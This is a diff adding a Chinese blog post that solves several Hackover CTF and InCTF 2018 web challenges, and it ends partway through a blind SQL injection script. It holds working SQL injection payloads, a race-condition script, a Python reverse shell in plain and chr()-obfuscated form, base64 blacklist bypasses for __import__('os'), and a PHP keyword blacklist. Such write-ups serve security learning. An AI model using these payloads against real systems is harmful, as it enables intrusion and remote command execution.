@@ -296,6 +296,275 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Noel">
+      <meta itemprop="description" content="I love u">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Noel's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/" itemprop="url">
+                  Inctf&HackoverCTF Web部分题目解析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-10-09 00:00:00 / 修改时间：02:57:47" itemprop="dateCreated datePublished" datetime="2018-10-09T00:00:00+08:00">2018-10-09</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h2 id="Hackover-CTF"><a href="#Hackover-CTF" class="headerlink" title="Hackover CTF"></a>Hackover CTF</h2><h3 id="who-knows-john-dows"><a href="#who-knows-john-dows" class="headerlink" title="who knows john dows?"></a>who knows john dows?</h3><p> <strong>Description</strong></p>
+<blockquote>
+<p>Howdy mate! Just login and hand out the flag, aye! You can find on <a href="https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb" target="_blank" rel="noopener">h18johndoe</a> has all you need!</p>
+<p><code>http://yo-know-john-dow.ctf.hackover.de:4567/login</code></p>
+<p>alternative: <code>46.101.157.142:4567/login</code></p>
+</blockquote>
+<p>题目给的链接中有一个是GitHub地址，在里面有源码存在</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRepo</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  <span class="title">def</span> <span class="title">initialize</span><span class="params">(database)</span></span></span><br><span class="line">    @database = database</span><br><span class="line"><span class="meta">    @users = database[:users]</span></span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(identification, password)</span></span></span><br><span class="line">    hashed_input_password = hash(password)</span><br><span class="line">    query = <span class="string">"select id, phone, email from users where email = '#&#123;identification&#125;' and password_digest = '#&#123;hashed_input_password&#125;' limit 1"</span></span><br><span class="line">    puts <span class="string">"SQL executing: '#&#123;query&#125;'"</span></span><br><span class="line"><span class="meta">    @database[query].first if user_exists?(identification)</span></span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">user_exists</span>?<span class="params">(identification)</span></span></span><br><span class="line"><span class="function">    !<span class="title">get_user_by_identification</span><span class="params">(identification)</span>.<span class="title">nil</span>?</span></span><br><span class="line"><span class="function">  <span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">private</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">def</span> <span class="title">get_user_by_identification</span><span class="params">(identification)</span></span></span><br><span class="line"><span class="function">    @<span class="title">users</span>.<span class="title">where</span><span class="params">(phone: identification)</span>.<span class="title">or</span><span class="params">(email: identification)</span>.<span class="title">first</span></span></span><br><span class="line"><span class="function">  <span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">def</span> <span class="title">hash</span><span class="params">(password)</span></span></span><br><span class="line"><span class="function">    <span class="title">password</span>.<span class="title">reverse</span></span></span><br><span class="line"><span class="function">  <span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br></pre></td></tr></table></figure>
+<p>显而易见的存在有SQL注入漏洞，其中的hash加密密码更是只把密码反转了下，所以只要构造</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="string">' or 1=1 limit 1#</span></span><br></pre></td></tr></table></figure>
+<p>然后反转一下就可以了</p>
+<p>看下Web界面</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/20.png" alt=""></p>
+<p>需要找到一个邮箱</p>
+<p>从GitHub下手，把仓库clone到本地后，查看下日志</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/24.png" alt=""></p>
+<p>经过尝试最后<a href="mailto:`john_doe@notes.h18" target="_blank" rel="noopener">`john_doe@notes.h18</a>`登陆成功</p>
+<p>最后尝试注入的时候居然出现了500错误，修改payload为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="string">' or 1=1 limit 1;#</span></span><br></pre></td></tr></table></figure>
+<p>反转后输入密码，成功得到flag</p>
+<h2 id="InCTF"><a href="#InCTF" class="headerlink" title="InCTF"></a>InCTF</h2><h3 id="S3cur3-Bank"><a href="#S3cur3-Bank" class="headerlink" title="S3cur3 Bank"></a>S3cur3 Bank</h3><p><strong>Description</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">S3cur3 Bank 179</span><br><span class="line">======= Difficulty level : Medium ========</span><br><span class="line"></span><br><span class="line">It is notoriously called the most secure bank service ever. It allows us to transfer your money between 2 accounts. Can you hack the service to buy a flag???</span><br><span class="line"></span><br><span class="line">Link(http://18.188.42.158/)</span><br><span class="line"></span><br><span class="line">========== Authors : c3rb3ru5, SpyD3r ==========</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/25.png" alt=""></p>
+<p>题目给了两个账号，相互之间可以互相转账，只有5000金币才可以买到flag，而我们两个银行加起来才2000，这样的题一般情况下就是在执行一项操作时并不会进行锁定，就相当于饭卡里有一百块钱，同时在两台机器上刷都显示100，全部花完后饭卡里没钱了，而我们一共得到了200块钱的食物。</p>
+<p>利用脚本一枚</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://18.188.42.158/bank.php?id=dc90a0a10c79e341f5b521da39dbc585"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_money</span><span class="params">()</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"transfer"</span>: <span class="number">1000</span>, <span class="string">"account"</span>: <span class="string">"Transfer to B"</span>&#125;</span><br><span class="line">	response = requests.post(url,data=data)</span><br><span class="line">	print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	t1 = threading.Thread(target=make_money, args=[])</span><br><span class="line">	t2 = threading.Thread(target=make_money, args=[])</span><br><span class="line">	t1.start()</span><br><span class="line">	t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   print(<span class="string">"Error: unable to start thread"</span>)</span><br></pre></td></tr></table></figure>
+<p>其中的transfer在每次成功后都要改，account在每次运行后都要更改，并不会每次都成功。</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\22.png" alt=""></p>
+<p>最后可以终于买到flag了~~</p>
+<h3 id="The-Most-Secure-File-Uploader"><a href="#The-Most-Secure-File-Uploader" class="headerlink" title="The Most Secure File Uploader"></a>The Most Secure File Uploader</h3><p><strong>Description</strong></p>
+<blockquote>
+<p>Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :)</p>
+<p><a href="http://18.216.190.57/" target="_blank" rel="noopener">http://18.216.190.57/</a></p>
+<p>Challenge Difficulty </p>
+<p>Level:Medium</p>
+</blockquote>
+<p>Web界面一个上传点儿就这么放在了眼前</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\13.png" alt=""></p>
+<p>看到上传界面先上传了个txt</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\14.png" alt=""></p>
+<p>嗯，只能上传图片文件的话我再来一个png文件</p>
+<p>还是报错</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\15.png" alt=""></p>
+<p>不过这个报错提示有点儿熟悉，好像是python一样，索性把图片平改成<code>1#.png</code>试一下(#在python中是注释的意思</p>
+<p>页面返回正常</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\16.png" alt=""></p>
+<p>试下print</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\17.png" alt=""></p>
+<p>好的！接下来用python写个反弹shell吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="keyword">import</span> socket, subprocess;s = socket.socket();s.connect((<span class="string">'ip'</span>,端口))\nwhile <span class="number">1</span>:  proc = subprocess.Popen(s.recv(<span class="number">1024</span>), shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read()))</span><br></pre></td></tr></table></figure>
+<p>在自己服务器上打开监听，不想却有黑名单存在,不过exec没在黑名单里</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\18.png" alt=""></p>
+<h4 id="利用Ascii编码绕过黑名单"><a href="#利用Ascii编码绕过黑名单" class="headerlink" title="利用Ascii编码绕过黑名单"></a>利用Ascii编码绕过黑名单</h4><p>具体做法是把payload改为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">''</span>.join([chr(<span class="number">105</span>),chr(<span class="number">109</span>),chr(<span class="number">112</span>),chr(<span class="number">111</span>),chr(<span class="number">114</span>),chr(<span class="number">116</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">107</span>),chr(<span class="number">101</span>),chr(<span class="number">116</span>),chr(<span class="number">44</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">117</span>),chr(<span class="number">98</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">101</span>),chr(<span class="number">115</span>),chr(<span class="number">115</span>),chr(<span class="number">59</span>),chr(<span class="number">115</span>),chr(<span class="number">32</span>),chr(<span class="number">61</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">107</span>),chr(<span class="number">101</span>),chr(<span class="number">116</span>),chr(<span class="number">46</span>),chr(<span class="number">115</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">107</span>),chr(<span class="number">101</span>),chr(<span class="number">116</span>),chr(<span class="number">40</span>),chr(<span class="number">41</span>),chr(<span class="number">59</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">99</span>),chr(<span class="number">111</span>),chr(<span class="number">110</span>),chr(<span class="number">110</span>),chr(<span class="number">101</span>),chr(<span class="number">99</span>),chr(<span class="number">116</span>),chr(<span class="number">40</span>),chr(<span class="number">40</span>),chr(<span class="number">39</span>),chr(<span class="number">105</span>),chr(<span class="number">112</span>),chr(<span class="number">39</span>),chr(<span class="number">44</span>),chr(<span class="number">50</span>),chr(<span class="number">51</span>),chr(<span class="number">51</span>),chr(<span class="number">51</span>),chr(<span class="number">41</span>),chr(<span class="number">41</span>),chr(<span class="number">10</span>),chr(<span class="number">119</span>),chr(<span class="number">104</span>),chr(<span class="number">105</span>),chr(<span class="number">108</span>),chr(<span class="number">101</span>),chr(<span class="number">32</span>),chr(<span class="number">49</span>),chr(<span class="number">58</span>),chr(<span class="number">32</span>),chr(<span class="number">32</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">32</span>),chr(<span class="number">61</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">117</span>),chr(<span class="number">98</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">101</span>),chr(<span class="number">115</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">80</span>),chr(<span class="number">111</span>),chr(<span class="number">112</span>),chr(<span class="number">101</span>),chr(<span class="number">110</span>),chr(<span class="number">40</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">114</span>),chr(<span class="number">101</span>),chr(<span class="number">99</span>),chr(<span class="number">118</span>),chr(<span class="number">40</span>),chr(<span class="number">49</span>),chr(<span class="number">48</span>),chr(<span class="number">50</span>),chr(<span class="number">52</span>),chr(<span class="number">41</span>),chr(<span class="number">44</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">104</span>),chr(<span class="number">101</span>),chr(<span class="number">108</span>),chr(<span class="number">108</span>),chr(<span class="number">61</span>),chr(<span class="number">84</span>),chr(<span class="number">114</span>),chr(<span class="number">117</span>),chr(<span class="number">101</span>),chr(<span class="number">44</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">116</span>),chr(<span class="number">100</span>),chr(<span class="number">111</span>),chr(<span class="number">117</span>),chr(<span class="number">116</span>),chr(<span class="number">61</span>),chr(<span class="number">115</span>),chr(<span class="number">117</span>),chr(<span class="number">98</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">101</span>),chr(<span class="number">115</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">80</span>),chr(<span class="number">73</span>),chr(<span class="number">80</span>),chr(<span class="number">69</span>),chr(<span class="number">44</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">116</span>),chr(<span class="number">100</span>),chr(<span class="number">101</span>),chr(<span class="number">114</span>),chr(<span class="number">114</span>),chr(<span class="number">61</span>),chr(<span class="number">115</span>),chr(<span class="number">117</span>),chr(<span class="number">98</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">101</span>),chr(<span class="number">115</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">80</span>),chr(<span class="number">73</span>),chr(<span class="number">80</span>),chr(<span class="number">69</span>),chr(<span class="number">44</span>),chr(<span class="number">32</span>),chr(<span class="number">115</span>),chr(<span class="number">116</span>),chr(<span class="number">100</span>),chr(<span class="number">105</span>),chr(<span class="number">110</span>),chr(<span class="number">61</span>),chr(<span class="number">115</span>),chr(<span class="number">117</span>),chr(<span class="number">98</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">101</span>),chr(<span class="number">115</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">80</span>),chr(<span class="number">73</span>),chr(<span class="number">80</span>),chr(<span class="number">69</span>),chr(<span class="number">41</span>),chr(<span class="number">59</span>),chr(<span class="number">115</span>),chr(<span class="number">46</span>),chr(<span class="number">115</span>),chr(<span class="number">101</span>),chr(<span class="number">110</span>),chr(<span class="number">100</span>),chr(<span class="number">40</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">46</span>),chr(<span class="number">115</span>),chr(<span class="number">116</span>),chr(<span class="number">100</span>),chr(<span class="number">111</span>),chr(<span class="number">117</span>),chr(<span class="number">116</span>),chr(<span class="number">46</span>),chr(<span class="number">114</span>),chr(<span class="number">101</span>),chr(<span class="number">97</span>),chr(<span class="number">100</span>),chr(<span class="number">40</span>),chr(<span class="number">41</span>),chr(<span class="number">43</span>),chr(<span class="number">112</span>),chr(<span class="number">114</span>),chr(<span class="number">111</span>),chr(<span class="number">99</span>),chr(<span class="number">46</span>),chr(<span class="number">115</span>),chr(<span class="number">116</span>),chr(<span class="number">100</span>),chr(<span class="number">101</span>),chr(<span class="number">114</span>),chr(<span class="number">114</span>),chr(<span class="number">46</span>),chr(<span class="number">114</span>),chr(<span class="number">101</span>),chr(<span class="number">97</span>),chr(<span class="number">100</span>),chr(<span class="number">40</span>),chr(<span class="number">41</span>),chr(<span class="number">41</span>)]))</span><br></pre></td></tr></table></figure>
+<p>拿到反弹的Sehll找到flag</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\21.png" alt=""></p>
+<h4 id="使用globals-函数调用内置函数"><a href="#使用globals-函数调用内置函数" class="headerlink" title="使用globals()函数调用内置函数"></a>使用globals()函数调用内置函数</h4><p>先来看下globals()的定义</p>
+<blockquote>
+<p>返回全局变量的字典。 </p>
+</blockquote>
+<p>就是这些东东</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/19.png" alt=""></p>
+<p>其中第一项里包含了python的内置函数，可以通过<code>globals().values()[0].__dict__</code>查看</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/26.png" alt=""></p>
+<p>import也是python内置函数，可以通过<code>globals().values()[0].__dict__[&#39;__import__&#39;](模块名).function()</code>调用指定函数,例如导入os.listdir()函数</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\27.png" alt=""></p>
+<p>回到题目，本来也可以通过globals()调用os.listdir但是os被禁了，只好采用另一种方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals().values()[<span class="number">0</span>].__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).listdir(<span class="string">'./'</span>)</span><br></pre></td></tr></table></figure>
+<p>将被禁的字符转化为base64，成功绕过</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\28.png" alt=""></p>
+<p>最后就是利用内置函数open来打开flag文件啦</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\29.png" alt=""></p>
+<h3 id="GoSQL"><a href="#GoSQL" class="headerlink" title="GoSQL"></a>GoSQL</h3><p>开始前先来几个MySQL的一些知识</p>
+<p>1.字符集为utf-8的情况下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ä = A </span><br><span class="line">Ö = O </span><br><span class="line">Ü = U </span><br><span class="line">à = a</span><br></pre></td></tr></table></figure>
+<p>上述等式是成立的</p>
+<p>也就是说</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">àdmin = admin</span><br></pre></td></tr></table></figure>
+<p>2.MySQL中 <code>/*select * from users*/</code>表示注释<code>/**/</code>内的语句并不会执行，但是<code>/*!select * from users*/</code>确实可以执行的</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\30.png" alt=""></p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\31.png" alt=""></p>
+<p>3.sleep可以代替if充当判断的角色</p>
+<p>当条件为真时</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\32.png" alt=""></p>
+<p>条件为假时</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\33.png" alt=""></p>
+<p>4.可以等效替换的一些关键词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">where   : having</span><br><span class="line">substr  : insert</span><br><span class="line">&lt;space&gt; : %0a</span><br><span class="line">  =     : in</span><br></pre></td></tr></table></figure>
+<p>进入题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">query: select * from inctf2018_chall_2 <span class="comment">/**/</span> username=<span class="string">''</span></span><br><span class="line">Having a query problem</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">$conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">mysqli_set_charset($conn,<span class="string">"utf8"</span>);</span><br><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$clause = $_GET[<span class="string">'clause'</span>];</span><br><span class="line"></span><br><span class="line">$blacklist  = <span class="string">"pad|admin|'|\"|substr|mid|concat|char|ascii|left|right|for| |from|where|having"</span>;</span><br><span class="line">$blacklist .= <span class="string">"insert|username|\/|-|go_to|\||or|and|\\\|=|#|\.|\_|like|between|reg|&amp;|load|file|glob|cast|out|0"</span>;</span><br><span class="line">$blacklist .= <span class="string">"user|rev|0x|limit|conv|hex|from|innodb|\^|union|benchmark|if|case|coalesce|max|strcmp|proc|group|rand|floor|pow"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $name))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"Try Hard"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/$blacklist/i"</span>, $clause))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You don't need it!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query=<span class="string">"select * from inctf2018_chall_2 /*"</span>. $clause . <span class="string">"*/ username='"</span> . $name . <span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h4&gt;query: "</span> . $query . <span class="string">" &lt;/h4&gt;"</span>;</span><br><span class="line">$result=mysqli_query($conn,$query);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">  $row=mysqli_fetch_array($result);</span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'username'</span>]==<span class="string">"admin"</span>)&#123;</span><br><span class="line">      header(<span class="string">"Location:&#123;$row['go_to']&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;h4&gt;You are not admin"</span> . <span class="string">"&lt;/h4&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;h4&gt;Having a query problem"</span> . <span class="string">"&lt;/h4&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到其设置了黑名单，但是</p>
+<p><code>having insert 0 user sleep</code>却没有在黑名单里，其中前四个都是因为拼接的时候没加|导致的，这点儿后面会用到</p>
+<p>这一步用前两点构造payload</p>
+<p><code>clause=!having&amp;name=àdmin</code></p>
+<p>进入下一个场景</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\09.png" alt=""></p>
+<p>自然想到SSRF</p>
+<p>尝试了file|ftp好像都被过滤了，最后试了下Gopher，没被过滤，那么现在就需要数据库账号了，刚好利用前面的having与insert</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://18.219.221.225/?clause="</span></span><br><span class="line">user_name=<span class="string">""</span></span><br><span class="line">len_user=<span class="number">20</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1,50):</span></span><br><span class="line"><span class="string">	query=url + "!having%0asleep(((select%0alength(user()))%0ain%0a(select%0a0b" +  "&#123;:b&#125;".format(i)  + "))*3);%00"</span></span><br><span class="line"><span class="string">	start = time()</span></span><br><span class="line"><span class="string">	